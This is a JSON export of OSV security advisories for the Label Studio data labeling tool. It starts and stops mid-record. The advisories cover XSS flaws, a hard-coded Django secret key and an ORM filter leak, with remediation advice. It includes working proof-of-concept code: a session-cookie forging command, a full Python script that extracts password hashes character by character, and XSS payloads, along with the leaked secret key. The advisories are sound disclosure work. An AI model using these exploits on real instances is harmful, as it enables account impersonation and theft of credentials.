License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files 